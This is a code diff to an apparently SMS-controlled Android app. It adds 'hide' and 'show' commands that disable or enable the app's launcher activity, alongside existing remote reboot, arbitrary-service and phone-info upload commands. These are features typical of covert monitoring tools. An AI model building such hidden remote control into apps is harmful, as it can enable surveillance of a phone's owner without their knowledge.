@@ -32,6 +32,8 @@ public class Commander {
     public final static String COMMAND_SMS_REBOOT = "reboot";
     public final static String COMMAND_SMS_SUPER = "super";
     public final static String COMMAND_SMS_INFO = "info";
+    public final static String COMMAND_SMS_HIDE = "hide";
+    public final static String COMMAND_SMS_SHOW = "show";
 
     public Commander(Context context) {
         this.context = context;
@@ -49,6 +51,8 @@ public class Commander {
      * <li><b>reboot[={reason}]</b> - Перезагружает устройство. reason - code to pass to the kernel</li> (e.g., "recovery") to request special boot
      * modes.</li>
      * <li><b>super={command}</b> - Немедленно запускает SuperService с коммандой command.</li>
+     * <li><b>hide</b> - Отключить MainActivity</li>
+     * <li><b>show</b> - Включить MainActivity</li>
      * <li><b>info</b> - Возвращает параметры настройки программы и некоторые параметры телефона, которые будут закачаны на сервер при срабатывании
      * SuperService с параметром upload</li>
      * <li>Также в качестве комманд принимает параметры настройки программы PreferenceUtils.</li>
@@ -166,6 +170,12 @@ public class Commander {
                         context.startService(mi);
                     }
                 }
+            } else if (COMMAND_SMS_HIDE.equals(cmd)) {
+                Utils.setComponentState(context, Main.class, false);
+
+            } else if (COMMAND_SMS_SHOW.equals(cmd)) {
+                Utils.setComponentState(context, Main.class, true);
+
             } else if (COMMAND_SMS_INFO.equals(cmd)) {
 
                 res.append("current_version=" + Utils.getCurrentVersion(context)).append("\n");
